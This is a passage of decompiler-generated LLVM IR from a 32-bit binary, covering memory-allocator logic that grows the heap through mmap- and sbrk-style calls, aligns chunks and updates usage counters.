  %v3_8053825 = add i32 %v2_8053825, %v1_8053825
  %v4_8053825 = inttoptr i32 %v3_8053825 to i32*
  %v5_8053825 = load i32, i32* %v4_8053825, align 4
  %v6_8053825 = or i32 %v5_8053825, 1
  store i32 %v6_8053825, i32* %v4_8053825, align 4
  br label %dec_label_pc_805386b

dec_label_pc_805382c:                             ; preds = %dec_label_pc_805380b
  store i32 %v1_8053908, i32* %eax.global-to-local, align 4
  %v0_8053835 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8053835 = add i32 %v0_8053835, %v1_8053908
  store i32 %v2_8053835, i32* @edx, align 4
  %v1_8053838 = load i32, i32* @ebp, align 4
  %v2_8053838 = add i32 %v1_8053838, 8
  %v3_8053838 = inttoptr i32 %v2_8053838 to i32*
  store i32 %v2_8053835, i32* %v3_8053838, align 4
  %v0_805383b = load i32, i32* @edx, align 4
  %v1_805383b = load i32, i32* @ebp, align 4
  %v2_805383b = add i32 %v1_805383b, 12
  %v3_805383b = inttoptr i32 %v2_805383b to i32*
  store i32 %v0_805383b, i32* %v3_805383b, align 4
  %v0_805383e = load i32, i32* @edx, align 4
  %v1_805383e = add i32 %v0_805383e, 8
  %v2_805383e = inttoptr i32 %v1_805383e to i32*
  store i32 ptrtoint (i32* @global_var_8057574.209 to i32), i32* %v2_805383e, align 4
  %v0_8053845 = load i32, i32* @edx, align 4
  %v1_8053845 = add i32 %v0_8053845, 12
  %v2_8053845 = inttoptr i32 %v1_8053845 to i32*
  store i32 ptrtoint (i32* @global_var_8057574.209 to i32), i32* %v2_8053845, align 4
  br i1 %v6_80535c1, label %dec_label_pc_8053854, label %dec_label_pc_805384e

dec_label_pc_805384e:                             ; preds = %dec_label_pc_805382c
  %v0_805384e = load i32, i32* @edx, align 4
  store i32 %v0_805384e, i32* @global_var_8057570.208, align 16
  br label %dec_label_pc_8053854

dec_label_pc_8053854:                             ; preds = %dec_label_pc_805382c, %dec_label_pc_805384e
  %v4_8053854 = or i32 %v1_8053908, 1
  %v0_8053859 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_8053854, i32* %ebx.global-to-local, align 4
  %v1_805385f = or i32 %v0_8053859, 1
  store i32 %v1_805385f, i32* %eax.global-to-local, align 4
  %v1_8053862 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8053862 = add i32 %v1_8053862, 4
  %v3_8053862 = inttoptr i32 %v2_8053862 to i32*
  store i32 %v4_8053854, i32* %v3_8053862, align 4
  %v0_8053865 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053865 = load i32, i32* @edx, align 4
  %v3_8053865 = add i32 %v1_8053865, %v0_8053865
  %v4_8053865 = inttoptr i32 %v3_8053865 to i32*
  store i32 %v0_8053865, i32* %v4_8053865, align 4
  %v0_8053868 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053868 = load i32, i32* @edx, align 4
  %v2_8053868 = add i32 %v1_8053868, 4
  %v3_8053868 = inttoptr i32 %v2_8053868 to i32*
  store i32 %v0_8053868, i32* %v3_8053868, align 4
  br label %dec_label_pc_805386b

dec_label_pc_805386b:                             ; preds = %dec_label_pc_8053825, %dec_label_pc_8053854
  %v0_805386b = load i32, i32* %ecx.global-to-local, align 4
  %v1_805386b = add i32 %v0_805386b, 8
  store i32 %v1_805386b, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053c6d

dec_label_pc_8053873.loopexit:                    ; preds = %dec_label_pc_80537c0
  br label %dec_label_pc_8053873

dec_label_pc_8053873:                             ; preds = %dec_label_pc_8053873.loopexit, %dec_label_pc_805357b, %dec_label_pc_8053583
  %v0_8053873 = load i32, i32* @global_var_805756c.207, align 4
  store i32 %v0_8053873, i32* @ebx, align 4
  %v1_805387d = add i32 %v1_8053908, 16
  store i32 %v1_805387d, i32* @esi, align 4
  %v1_8053880 = add i32 %v0_8053873, 4
  %v2_8053880 = inttoptr i32 %v1_8053880 to i32*
  %v3_8053880 = load i32, i32* %v2_8053880, align 4
  %v1_8053887 = and i32 %v3_8053880, -4
  store i32 %v1_8053887, i32* %ecx.global-to-local, align 4
  %v7_805388a = icmp ult i32 %v1_8053887, %v1_805387d
  br i1 %v7_805388a, label %dec_label_pc_80538aa, label %dec_label_pc_805388e

dec_label_pc_805388e:                             ; preds = %dec_label_pc_8053873
  %v2_8053892 = add i32 %v0_8053873, %v1_8053908
  store i32 %v2_8053892, i32* @edx, align 4
  %v1_8053895 = or i32 %v1_8053908, 1
  store i32 %v1_8053895, i32* %eax.global-to-local, align 4
  store i32 %v2_8053892, i32* @global_var_805756c.207, align 4
  store i32 %v1_8053895, i32* %v2_8053880, align 4
  %v0_80538a1 = load i32, i32* %ecx.global-to-local, align 4
  %v5_80538a1 = sub i32 %v0_80538a1, %v1_8053908
  store i32 %v5_80538a1, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8053bfd

dec_label_pc_80538aa:                             ; preds = %dec_label_pc_8053873
  %v0_80538aa = load i32, i32* @global_var_805789c.212, align 4
  store i32 %v0_80538aa, i32* %edx.global-to-local, align 4
  %v0_80538b0 = load i8, i8* @global_var_8057540.206, align 64
  %v1_80538b0 = and i8 %v0_80538b0, 2
  %v2_80538b0 = icmp eq i8 %v1_80538b0, 0
  br i1 %v2_80538b0, label %dec_label_pc_80538de, label %dec_label_pc_80538b9

dec_label_pc_80538b9:                             ; preds = %dec_label_pc_80538aa
  store i32 ptrtoint (i8* @global_var_8057540.206 to i32), i32* %stack_var_-92, align 4
  %v2_80538c1 = call i32 @function_8054131(i32* bitcast (i8* @global_var_8057540.206 to i32*))
  store i32 ptrtoint (i8* @global_var_8057540.206 to i32), i32* @ebx, align 4
  %v1_80538cb = add i32 %v1_8053908, -7
  store i32 %v1_80538cb, i32* %eax.global-to-local, align 4
  store i32 %v1_80538cb, i32* %stack_var_-92, align 4
  %v1_80538cf = call i32 @function_8053514(i32 %v1_80538cb)
  store i32 %v1_80538cf, i32* %eax.global-to-local, align 4
  store i32 %v1_80538cf, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053c6d

dec_label_pc_80538de:                             ; preds = %dec_label_pc_80538aa
  %v1_80538de = add i32 %v0_80538aa, -1
  store i32 %v1_80538de, i32* @ecx, align 4
  store i32 %v1_8053908, i32* @ebx, align 4
  %v1_80538e9 = load i32, i32* @global_var_805788c.213, align 4
  %v7_80538e9 = icmp ult i32 %v1_8053908, %v1_80538e9
  br i1 %v7_80538e9, label %dec_label_pc_80539ab, label %dec_label_pc_80538f5

dec_label_pc_80538f5:                             ; preds = %dec_label_pc_80538de
  %v0_80538f5 = load i32, i32* @global_var_8057890.214, align 16
  store i32 %v0_80538f5, i32* %eax.global-to-local, align 4
  %v1_80538fa = load i32, i32* @global_var_8057894.215, align 4
  %v5_8053900 = icmp slt i32 %v0_80538f5, %v1_80538fa
  br i1 %v5_8053900, label %dec_label_pc_8053906, label %dec_label_pc_80539ab

dec_label_pc_8053906:                             ; preds = %dec_label_pc_80538f5
  %v2_8053908 = add i32 %v1_8053908, 10
  %v3_8053908 = add i32 %v2_8053908, %v0_80538aa
  %v1_805390c = sub i32 0, %v0_80538aa
  store i32 %v1_805390c, i32* %eax.global-to-local, align 4
  %v2_805390e = and i32 %v3_8053908, %v1_805390c
  store i32 %v2_805390e, i32* @ebx, align 4
  %tmp128 = icmp ugt i32 %v2_805390e, %v1_8053908
  br i1 %tmp128, label %dec_label_pc_805391a, label %dec_label_pc_80539ab

dec_label_pc_805391a:                             ; preds = %dec_label_pc_8053906
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8053927 = call i32 @function_8054d58(i32 0, i32 %v2_805390e, i32 3, i32 34, i32 0, i32 0, i32 %v1_80538de, i32 %v1_80538de)
  store i32 %v8_8053927, i32* %eax.global-to-local, align 4
  store i32 %v8_8053927, i32* @edx, align 4
  %v10_8053931 = icmp eq i32 %v8_8053927, -1
  br i1 %v10_8053931, label %dec_label_pc_805391a.dec_label_pc_80539ab_crit_edge, label %dec_label_pc_8053936

dec_label_pc_805391a.dec_label_pc_80539ab_crit_edge: ; preds = %dec_label_pc_805391a
  %v0_80539ab.pre = load i32, i32* @global_var_805756c.207, align 4
  br label %dec_label_pc_80539ab

dec_label_pc_8053936:                             ; preds = %dec_label_pc_805391a
  %v1_8053938 = urem i32 %v8_8053927, 8
  %v2_8053938 = icmp eq i32 %v1_8053938, 0
  store i32 %v1_8053938, i32* %ecx.global-to-local, align 4
  br i1 %v2_8053938, label %dec_label_pc_8053950, label %dec_label_pc_805393d

dec_label_pc_805393d:                             ; preds = %dec_label_pc_8053936
  %v0_8053942 = load i32, i32* @ebx, align 4
  %v2_8053944 = sub nsw i32 8, %v1_8053938
  store i32 %v2_8053944, i32* %eax.global-to-local, align 4
  %v2_8053946 = add i32 %v2_8053944, %v8_8053927
  store i32 %v2_8053946, i32* @edx, align 4
  %v2_8053948 = sub i32 %v0_8053942, %v2_8053944
  store i32 %v2_8053948, i32* %esi.global-to-local, align 4
  %v2_805394a = inttoptr i32 %v2_8053946 to i32*
  store i32 %v2_8053944, i32* %v2_805394a, align 4
  br label %dec_label_pc_8053958

dec_label_pc_8053950:                             ; preds = %dec_label_pc_8053936
  %v1_8053950 = inttoptr i32 %v8_8053927 to i32*
  store i32 0, i32* %v1_8053950, align 4
  br label %dec_label_pc_8053958

dec_label_pc_8053958:                             ; preds = %dec_label_pc_805393d, %dec_label_pc_8053950
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_805393d ], [ @ebx, %dec_label_pc_8053950 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_8053958 = or i32 %storemerge, 2
  %v1_805395b = load i32, i32* @edx, align 4
  %v2_805395b = add i32 %v1_805395b, 4
  %v3_805395b = inttoptr i32 %v2_805395b to i32*
  store i32 %v1_8053958, i32* %v3_805395b, align 4
  %v0_805395e = load i32, i32* @global_var_8057890.214, align 16
  %v1_8053963 = add i32 %v0_805395e, 1
  store i32 %v1_8053963, i32* %eax.global-to-local, align 4
  store i32 %v1_8053963, i32* @global_var_8057890.214, align 16
  %v1_8053969 = load i32, i32* @global_var_8057898.216, align 8
  %v7_805396f = icmp sgt i32 %v1_8053963, %v1_8053969
  br i1 %v7_805396f, label %dec_label_pc_8053971, label %dec_label_pc_8053976

dec_label_pc_8053971:                             ; preds = %dec_label_pc_8053958
  store i32 %v1_8053963, i32* @global_var_8057898.216, align 8
  br label %dec_label_pc_8053976

dec_label_pc_8053976:                             ; preds = %dec_label_pc_8053958, %dec_label_pc_8053971
  %v0_8053976 = load i32, i32* @global_var_80578a4.217, align 4
  %v1_805397b = load i32, i32* @ebx, align 4
  %v2_805397b = add i32 %v1_805397b, %v0_8053976
  store i32 %v2_805397b, i32* %eax.global-to-local, align 4
  store i32 %v2_805397b, i32* @global_var_80578a4.217, align 4
  %v1_8053982 = load i32, i32* @global_var_80578b0.218, align 16
  %tmp129 = icmp ugt i32 %v2_805397b, %v1_8053982
  br i1 %tmp129, label %dec_label_pc_805398a, label %dec_label_pc_805398f

dec_label_pc_805398a:                             ; preds = %dec_label_pc_8053976
  store i32 %v2_805397b, i32* @global_var_80578b0.218, align 16
  br label %dec_label_pc_805398f

dec_label_pc_805398f:                             ; preds = %dec_label_pc_8053976, %dec_label_pc_805398a
  %v1_805398f = load i32, i32* @global_var_80578a8.219, align 8
  %v2_805398f = add i32 %v1_805398f, %v2_805397b
  store i32 %v2_805398f, i32* %eax.global-to-local, align 4
  %v1_8053995 = load i32, i32* @global_var_80578b4.220, align 4
  %tmp130 = icmp ugt i32 %v2_805398f, %v1_8053995
  br i1 %tmp130, label %dec_label_pc_80539a1, label %dec_label_pc_80535f2

dec_label_pc_80539a1:                             ; preds = %dec_label_pc_805398f
  store i32 %v2_805398f, i32* @global_var_80578b4.220, align 4
  br label %dec_label_pc_80535f2

dec_label_pc_80539ab:                             ; preds = %dec_label_pc_8053906, %dec_label_pc_805391a.dec_label_pc_80539ab_crit_edge, %dec_label_pc_80538f5, %dec_label_pc_80538de
  %v0_80539ab = phi i32 [ %v0_80539ab.pre, %dec_label_pc_805391a.dec_label_pc_80539ab_crit_edge ], [ %v0_8053873, %dec_label_pc_80538f5 ], [ %v0_8053873, %dec_label_pc_8053906 ], [ %v0_8053873, %dec_label_pc_80538de ]
  store i32 %v0_80539ab, i32* %eax.global-to-local, align 4
  %v1_80539b4 = add i32 %v0_80539ab, 4
  %v2_80539b4 = inttoptr i32 %v1_80539b4 to i32*
  %v3_80539b4 = load i32, i32* %v2_80539b4, align 4
  %v1_80539be = and i32 %v3_80539b4, -4
  %v2_80539be = icmp eq i32 %v1_80539be, 0
  store i32 %v1_80539be, i32* @ebp, align 4
  %v1_80539c1 = load i32, i32* @global_var_8057888.221, align 8
  %v2_80539c1 = add i32 %v1_80539c1, %v1_805387d
  store i32 %v2_80539c1, i32* %eax.global-to-local, align 4
  %v0_80539c7 = load i8, i8* @global_var_80578a0.222, align 32
  %v1_80539c7 = urem i8 %v0_80539c7, 2
  %v2_80539c7 = icmp eq i8 %v1_80539c7, 0
  br i1 %v2_80539c7, label %dec_label_pc_80539d2, label %dec_label_pc_80539d0

dec_label_pc_80539d0:                             ; preds = %dec_label_pc_80539ab
  %v2_80539d0 = sub i32 %v2_80539c1, %v1_80539be
  store i32 %v2_80539d0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80539d2

dec_label_pc_80539d2:                             ; preds = %dec_label_pc_80539ab, %dec_label_pc_80539d0
  %v0_80539d6 = phi i32 [ %v2_80539c1, %dec_label_pc_80539ab ], [ %v2_80539d0, %dec_label_pc_80539d0 ]
  %v5_80539d6 = add i32 %v0_80539d6, %v1_80538de
  store i32 %v5_80539d6, i32* %eax.global-to-local, align 4
  %v1_80539da = sub i32 0, %v0_80538aa
  store i32 %v1_80539da, i32* @edx, align 4
  %v2_80539e2 = and i32 %v5_80539d6, %v1_80539da
  store i32 %v2_80539e2, i32* @esi, align 4
  %tmp91 = icmp slt i32 %v2_80539e2, 1
  br i1 %tmp91, label %dec_label_pc_80539fc, label %dec_label_pc_80539e6

dec_label_pc_80539e6:                             ; preds = %dec_label_pc_80539d2
  store i32 %v2_80539e2, i32* %stack_var_-92, align 4
  %v1_80539ea = call i32 @function_8055209(i32 %v2_80539e2)
  store i32 %v1_80539ea, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_80539ea, i32* @ebx, align 4
  %v10_80539f7 = icmp eq i32 %v1_80539ea, -1
  %v1_80539fa = icmp eq i1 %v10_80539f7, false
  br i1 %v1_80539fa, label %dec_label_pc_8053a52.dec_label_pc_8053a5b_crit_edge, label %dec_label_pc_80539e6.dec_label_pc_80539fc_crit_edge

dec_label_pc_80539e6.dec_label_pc_80539fc_crit_edge: ; preds = %dec_label_pc_80539e6
  %v0_80539fc.pre = load i8, i8* @global_var_80578a0.222, align 32
  br label %dec_label_pc_80539fc

dec_label_pc_80539fc:                             ; preds = %dec_label_pc_80539e6.dec_label_pc_80539fc_crit_edge, %dec_label_pc_80539d2
  %v0_8053a28 = phi i32 [ -1, %dec_label_pc_80539e6.dec_label_pc_80539fc_crit_edge ], [ %v1_80539da, %dec_label_pc_80539d2 ]
  %v0_80539fc = phi i8 [ %v0_80539fc.pre, %dec_label_pc_80539e6.dec_label_pc_80539fc_crit_edge ], [ %v0_80539c7, %dec_label_pc_80539d2 ]
  %v1_80539fc = urem i8 %v0_80539fc, 2
  %v2_80539fc = icmp eq i8 %v1_80539fc, 0
  br i1 %v2_80539fc, label %dec_label_pc_80539fc.dec_label_pc_8053a11_crit_edge, label %dec_label_pc_8053a05

dec_label_pc_80539fc.dec_label_pc_8053a11_crit_edge: ; preds = %dec_label_pc_80539fc
  %v0_8053a11.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053a11

dec_label_pc_8053a05:                             ; preds = %dec_label_pc_80539fc
  %v2_8053a09 = add i32 %v1_80539be, %v1_80538de
  store i32 %v2_8053a09, i32* %eax.global-to-local, align 4
  %v0_8053a0b = load i32, i32* @esi, align 4
  %v2_8053a0b = add i32 %v0_8053a0b, %v2_8053a09
  %v5_8053a0d = and i32 %v2_8053a0b, %v1_80539da
  store i32 %v5_8053a0d, i32* @esi, align 4
  br label %dec_label_pc_8053a11

dec_label_pc_8053a11:                             ; preds = %dec_label_pc_80539fc.dec_label_pc_8053a11_crit_edge, %dec_label_pc_8053a05
  %v0_8053a11 = phi i32 [ %v0_8053a11.pre, %dec_label_pc_80539fc.dec_label_pc_8053a11_crit_edge ], [ %v5_8053a0d, %dec_label_pc_8053a05 ]
  %tmp131 = icmp ult i32 %v0_8053a11, 1048576
  br i1 %tmp131, label %dec_label_pc_8053a19, label %dec_label_pc_8053a1e

dec_label_pc_8053a19:                             ; preds = %dec_label_pc_8053a11
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_8053a1e

dec_label_pc_8053a1e:                             ; preds = %dec_label_pc_8053a11, %dec_label_pc_8053a19
  %v0_8053a32 = phi i32 [ %v0_8053a11, %dec_label_pc_8053a11 ], [ 1048576, %dec_label_pc_8053a19 ]
  %tmp132 = icmp ugt i32 %v0_8053a32, %v1_8053908
  br i1 %tmp132, label %dec_label_pc_8053a28, label %dec_label_pc_8053c60

dec_label_pc_8053a28:                             ; preds = %dec_label_pc_8053a1e
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8053a35 = call i32 @function_8054d58(i32 0, i32 %v0_8053a32, i32 3, i32 34, i32 0, i32 0, i32 %v0_8053a28, i32 %v0_8053a28)
  store i32 %v8_8053a35, i32* %eax.global-to-local, align 4
  store i32 %v8_8053a35, i32* @ebx, align 4
  %v10_8053a3f = icmp eq i32 %v8_8053a35, -1
  br i1 %v10_8053a3f, label %dec_label_pc_8053c60, label %dec_label_pc_8053a52.thread

dec_label_pc_8053a52.thread:                      ; preds = %dec_label_pc_8053a28
  %v0_8053a48 = load i8, i8* @global_var_80578a0.222, align 1
  %v2_8053a48 = and i8 %v0_8053a48, -2
  store i8 %v2_8053a48, i8* @global_var_80578a0.222, align 32
  %v1_8053a4f = load i32, i32* @esi, align 4
  %v2_8053a4f = add i32 %v1_8053a4f, %v8_8053a35
  store i32 %v2_8053a4f, i32* @edx, align 4
  br label %dec_label_pc_8053a5b

dec_label_pc_8053a52.dec_label_pc_8053a5b_crit_edge: ; preds = %dec_label_pc_80539e6
  %v1_8053a5f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053a5b

dec_label_pc_8053a5b:                             ; preds = %dec_label_pc_8053a52.dec_label_pc_8053a5b_crit_edge, %dec_label_pc_8053a52.thread
  %v1_8053a5f = phi i32 [ %v1_8053a4f, %dec_label_pc_8053a52.thread ], [ %v1_8053a5f.pre, %dec_label_pc_8053a52.dec_label_pc_8053a5b_crit_edge ]
  %v0_8053b2794 = phi i32 [ %v8_8053a35, %dec_label_pc_8053a52.thread ], [ %v1_80539ea, %dec_label_pc_8053a52.dec_label_pc_8053a5b_crit_edge ]
  %v0_8053b1993 = phi i32 [ %v2_8053a4f, %dec_label_pc_8053a52.thread ], [ -1, %dec_label_pc_8053a52.dec_label_pc_8053a5b_crit_edge ]
  %v0_8053a5f = load i32, i32* @global_var_80578a8.219, align 8
  %v2_8053a5f = add i32 %v1_8053a5f, %v0_8053a5f
  store i32 %v2_8053a5f, i32* @global_var_80578a8.219, align 8
  %v2_8053a65 = add i32 %v1_80539be, %v0_80539ab
  store i32 %v2_8053a65, i32* %ecx.global-to-local, align 4
  %v2_8053a67 = sub i32 %v0_8053b2794, %v2_8053a65
  %v7_8053a67 = icmp ult i32 %v0_8053b2794, %v2_8053a65
  %v12_8053a67 = icmp eq i32 %v2_8053a67, 0
  %v1_8053a69 = icmp eq i1 %v12_8053a67, false
  br i1 %v1_8053a69, label %dec_label_pc_8053a82, label %dec_label_pc_8053a6b

dec_label_pc_8053a6b:                             ; preds = %dec_label_pc_8053a5b
  %v10_8053a6b = icmp eq i32 %v0_8053b1993, -1
  %v1_8053a6e = icmp eq i1 %v10_8053a6b, false
  br i1 %v1_8053a6e, label %dec_label_pc_8053a82, label %dec_label_pc_8053a70

dec_label_pc_8053a70:                             ; preds = %dec_label_pc_8053a6b
  %v2_8053a70 = add i32 %v1_8053a5f, %v1_80539be
  store i32 %v0_80539ab, i32* %ecx.global-to-local, align 4
  %v1_8053a77 = or i32 %v2_8053a70, 1
  store i32 %v1_8053a77, i32* %eax.global-to-local, align 4
  store i32 %v1_8053a77, i32* %v2_80539b4, align 4
  br label %dec_label_pc_8053baf

dec_label_pc_8053a82:                             ; preds = %dec_label_pc_8053a6b, %dec_label_pc_8053a5b
  %v0_8053a82 = load i8, i8* @global_var_80578a0.222, align 1
  %v1_8053a82 = sext i8 %v0_8053a82 to i32
  store i32 %v1_8053a82, i32* %eax.global-to-local, align 4
  %v2_8053a87 = urem i8 %v0_8053a82, 2
  %v3_8053a87 = icmp eq i8 %v2_8053a87, 0
  br i1 %v3_8053a87, label %dec_label_pc_8053a9b, label %dec_label_pc_8053a8b

dec_label_pc_8053a8b:                             ; preds = %dec_label_pc_8053a82
  br i1 %v2_80539be, label %dec_label_pc_8053a9b, label %dec_label_pc_8053a8f

dec_label_pc_8053a8f:                             ; preds = %dec_label_pc_8053a8b
  %v1_8053a91 = icmp eq i1 %v7_8053a67, false
  br i1 %v1_8053a91, label %dec_label_pc_8053a9b, label %dec_label_pc_8053a93

dec_label_pc_8053a93:                             ; preds = %dec_label_pc_8053a8f
  %v1_8053a93 = and i32 %v1_8053a82, -2
  %v4_8053a93 = trunc i32 %v1_8053a93 to i8
  store i32 %v1_8053a93, i32* %eax.global-to-local, align 4
  store i8 %v4_8053a93, i8* @global_var_80578a0.222, align 32
  br label %dec_label_pc_8053a9b

dec_label_pc_8053a9b:                             ; preds = %dec_label_pc_8053a8f, %dec_label_pc_8053a8b, %dec_label_pc_8053a82, %dec_label_pc_8053a93
  %v0_8053a9b = phi i8 [ %v0_8053a82, %dec_label_pc_8053a8f ], [ %v0_8053a82, %dec_label_pc_8053a8b ], [ %v0_8053a82, %dec_label_pc_8053a82 ], [ %v4_8053a93, %dec_label_pc_8053a93 ]
  %v1_8053a9b = urem i8 %v0_8053a9b, 2
  %v2_8053a9b = icmp eq i8 %v1_8053a9b, 0
  br i1 %v2_8053a9b, label %dec_label_pc_8053b19, label %dec_label_pc_8053aa4

dec_label_pc_8053aa4:                             ; preds = %dec_label_pc_8053a9b
  br i1 %v2_80539be, label %dec_label_pc_8053ab2, label %dec_label_pc_8053aa8

dec_label_pc_8053aa8:                             ; preds = %dec_label_pc_8053aa4
  store i32 %v2_8053a67, i32* %eax.global-to-local, align 4
  %v2_8053aac = add i32 %v2_8053a5f, %v2_8053a67
  store i32 %v2_8053aac, i32* @global_var_80578a8.219, align 8
  br label %dec_label_pc_8053ab2

dec_label_pc_8053ab2:                             ; preds = %dec_label_pc_8053aa4, %dec_label_pc_8053aa8
  %v1_8053ab4 = urem i32 %v0_8053b2794, 8
  %v2_8053ab4 = icmp eq i32 %v1_8053ab4, 0
  store i32 %v1_8053ab4, i32* %edx.global-to-local, align 4
  %v1_8053ab7 = icmp eq i1 %v2_8053ab4, false
  br i1 %v1_8053ab7, label %dec_label_pc_8053abf, label %dec_label_pc_8053ab9

dec_label_pc_8053ab9:                             ; preds = %dec_label_pc_8053ab2
  store i32 %v0_8053b2794, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ac9

dec_label_pc_8053abf:                             ; preds = %dec_label_pc_8053ab2
  %v2_8053ac4 = sub nsw i32 8, %v1_8053ab4
  store i32 %v2_8053ac4, i32* %eax.global-to-local, align 4
  %v2_8053ac6 = add i32 %v2_8053ac4, %v0_8053b2794
  store i32 %v2_8053ac6, i32* @edi, align 4
  br label %dec_label_pc_8053ac9

dec_label_pc_8053ac9:                             ; preds = %dec_label_pc_8053ab9, %dec_label_pc_8053abf
  %v0_8053acc = phi i32 [ 0, %dec_label_pc_8053ab9 ], [ %v2_8053ac4, %dec_label_pc_8053abf ]
  %v2_8053ac9 = add i32 %v1_8053a5f, %v0_8053b2794
  %v2_8053acc = add i32 %v0_8053acc, %v1_80539be
  store i32 %v2_8053acc, i32* %ecx.global-to-local, align 4
  %v2_8053ad5 = add i32 %v2_8053acc, %v2_8053ac9
  store i32 %v2_8053ad5, i32* %edx.global-to-local, align 4
  %v2_8053adb = add i32 %v2_8053ad5, %v1_80538de
  %v5_8053ade = and i32 %v2_8053adb, %v1_80539da
  %v2_8053ae5 = sub i32 %v5_8053ade, %v2_8053ad5
  store i32 %v2_8053ae5, i32* %eax.global-to-local, align 4
  %v2_8053ae7 = add i32 %v2_8053ae5, %v2_8053acc
  store i32 %v2_8053ae7, i32* @esi, align 4
  store i32 %v2_8053ae7, i32* %stack_var_-92, align 4
  %v1_8053aeb = call i32 @function_8055209(i32 %v2_8053ae7)
  store i32 %v1_8053aeb, i32* %eax.global-to-local, align 4
  store i32 %v1_8053aeb, i32* @edx, align 4
  %v10_8053af5 = icmp eq i32 %v1_8053aeb, -1
  %v1_8053af8 = icmp eq i1 %v10_8053af5, false
  br i1 %v1_8053af8, label %dec_label_pc_8053b08, label %dec_label_pc_8053afa

dec_label_pc_8053afa:                             ; preds = %dec_label_pc_8053ac9
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8053aff = call i32 @function_8055209(i32 0)
  store i32 %v1_8053aff, i32* %eax.global-to-local, align 4
  store i32 %v1_8053aff, i32* @edx, align 4
  br label %dec_label_pc_8053b3c

dec_label_pc_8053b08:                             ; preds = %dec_label_pc_8053ac9
  %v1_8053b08 = load i32, i32* @ebx, align 4
  %v7_8053b08 = icmp ult i32 %v1_8053aeb, %v1_8053b08
  %v1_8053b0a = icmp eq i1 %v7_8053b08, false
  br i1 %v1_8053b0a, label %dec_label_pc_8053b41, label %dec_label_pc_8053b0c

dec_label_pc_8053b0c:                             ; preds = %dec_label_pc_8053b08
  %v0_8053b0c = load i8, i8* @global_var_80578a0.222, align 1
  %v2_8053b0c = and i8 %v0_8053b0c, -2
  store i8 %v2_8053b0c, i8* @global_var_80578a0.222, align 32
  store i32 %v2_8053ac9, i32* @edx, align 4
  br label %dec_label_pc_8053b20

dec_label_pc_8053b19:                             ; preds = %dec_label_pc_8053a9b
  %v10_8053b19 = icmp eq i32 %v0_8053b1993, -1
  br i1 %v10_8053b19, label %dec_label_pc_8053b24, label %dec_label_pc_8053b1e

dec_label_pc_8053b1e:                             ; preds = %dec_label_pc_8053b19
  store i32 %v0_8053b2794, i32* @edi, align 4
  br label %dec_label_pc_8053b20

dec_label_pc_8053b20:                             ; preds = %dec_label_pc_8053b0c, %dec_label_pc_8053b1e
  %v0_8053b4158 = phi i32 [ %v2_8053ac9, %dec_label_pc_8053b0c ], [ %v0_8053b1993, %dec_label_pc_8053b1e ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8053b41

dec_label_pc_8053b24:                             ; preds = %dec_label_pc_8053b19
  store i32 %v0_8053b2794, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8053b2b = call i32 @function_8055209(i32 0)
  store i32 %v1_8053b2b, i32* @edx, align 4
  %v1_8053b32 = load i32, i32* @ebx, align 4
  %v2_8053b32 = sub i32 %v1_8053b2b, %v1_8053b32
  %v1_8053b34 = load i32, i32* @esi, align 4
  %v2_8053b34 = sub i32 %v2_8053b32, %v1_8053b34
  store i32 %v2_8053b34, i32* %eax.global-to-local, align 4
  %v0_8053b36 = load i32, i32* @global_var_80578a8.219, align 8
  %v2_8053b36 = add i32 %v0_8053b36, %v2_8053b34
  store i32 %v2_8053b36, i32* @global_var_80578a8.219, align 8
  br label %dec_label_pc_8053b3c

dec_label_pc_8053b3c:                             ; preds = %dec_label_pc_8053afa, %dec_label_pc_8053b24
  %v0_8053b4157 = phi i32 [ %v1_8053aff, %dec_label_pc_8053afa ], [ %v1_8053b2b, %dec_label_pc_8053b24 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8053b41

dec_label_pc_8053b41:                             ; preds = %dec_label_pc_8053b08, %dec_label_pc_8053b20, %dec_label_pc_8053b3c
  %v0_8053b46 = phi i32 [ %v1_8053aeb, %dec_label_pc_8053b08 ], [ %v0_8053b4158, %dec_label_pc_8053b20 ], [ %v0_8053b4157, %dec_label_pc_8053b3c ]
  %v10_8053b41 = icmp eq i32 %v0_8053b46, -1
  br i1 %v10_8053b41, label %dec_label_pc_8053baf, label %dec_label_pc_8053b46

dec_label_pc_8053b46:                             ; preds = %dec_label_pc_8053b41
  %v1_8053b46 = load i32, i32* @edi, align 4
  %v2_8053b46 = sub i32 %v0_8053b46, %v1_8053b46
  store i32 %v2_8053b46, i32* @edx, align 4
  store i32 %v1_8053b46, i32* @global_var_805756c.207, align 4
  %v1_8053b4e = load i32, i32* @esi, align 4
  %v2_8053b4e = add i32 %v1_8053b4e, %v2_8053b46
  %v1_8053b51 = or i32 %v2_8053b4e, 1
  store i32 %v1_8053b51, i32* %eax.global-to-local, align 4
  %v2_8053b54 = add i32 %v1_8053b46, 4
  %v3_8053b54 = inttoptr i32 %v2_8053b54 to i32*
  store i32 %v1_8053b51, i32* %v3_8053b54, align 4
  %v0_8053b57 = load i32, i32* @global_var_80578a8.219, align 8
  %v1_8053b57 = load i32, i32* @esi, align 4
  %v2_8053b57 = add i32 %v1_8053b57, %v0_8053b57
  store i32 %v2_8053b57, i32* @global_var_80578a8.219, align 8
  br i1 %v2_80539be, label %dec_label_pc_8053baf, label %dec_label_pc_8053b61

dec_label_pc_8053b61:                             ; preds = %dec_label_pc_8053b46
  %v1_8053b61 = add i32 %v1_80539be, -12
